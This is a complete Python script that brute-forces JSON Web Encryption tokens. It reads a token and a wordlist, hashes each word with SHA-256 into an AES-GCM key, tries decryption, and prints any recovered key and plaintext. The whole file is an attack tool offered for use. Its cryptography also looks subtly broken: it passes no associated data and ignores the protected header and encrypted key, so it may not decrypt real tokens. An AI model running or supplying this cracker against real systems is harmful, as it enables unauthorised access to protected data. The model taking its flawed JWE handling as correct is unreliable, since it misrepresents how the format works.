#!/usr/bin/python

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
import hashlib
import sys
import os

# Decode base64url encoded data
def decode_base64url(data):
    padding = '=' * (-len(data) % 4)  # Add padding if necessary
    return base64.urlsafe_b64decode(data + padding)

# Brute-force decryption function for JWE token
def brute_force_jwe(jwe_token, wordlist_path):
    # Check if wordlist exists
    if not os.path.exists(wordlist_path):
        print(f"Error: Wordlist file '{wordlist_path}' not found.")
        sys.exit(1)

    # Read the wordlist
    with open(wordlist_path, 'r') as file:
        keys = file.read().splitlines()

    # Split the JWE token into its 5 parts
    parts = jwe_token.split('.')
    if len(parts) != 5:
        print("Error: Invalid JWE token format. Ensure it has five parts separated by dots.")
        sys.exit(1)

    # Extract each component of the JWE
    header, encrypted_key, iv, ciphertext, tag = parts

    # Base64 URL decode each component
    iv = decode_base64url(iv)
    ciphertext = decode_base64url(ciphertext)
    tag = decode_base64url(tag)

    print(f"Starting brute-force with {len(keys)} keys...")

    # Attempt decryption for each key
    for key in keys:
        try:
            # Hash the key to 256-bit for AES-GCM
            key_256bit = hashlib.sha256(key.encode()).digest()

            # Use AES-GCM to attempt decryption
            aesgcm = AESGCM(key_256bit)
            decrypted_data = aesgcm.decrypt(iv, ciphertext + tag, None)  # No associated data

            # If successful, print the decrypted payload
            print(f"\n[+] Key Found: {key}")
            print(f"[+] Decrypted Payload: {decrypted_data.decode('utf-8')}")
            return
        except Exception as e:
            continue

    print("\n[-] No matching key found in the wordlist.")

# Main function
if __name__ == "__main__":
    # Check arguments
    if len(sys.argv) != 3:
        print("Usage: python jwe_bruteforce.py <jwe-token-file> <wordlist-file>")
        sys.exit(1)

    # Read the JWE token and wordlist file paths from arguments
    token_file = sys.argv[1]
    wordlist_file = sys.argv[2]

    # Read the JWE token from the file
    with open(token_file, 'r') as file:
        jwe_token = file.read().strip()

    # Run brute-force decryption
    brute_force_jwe(jwe_token, wordlist_file)
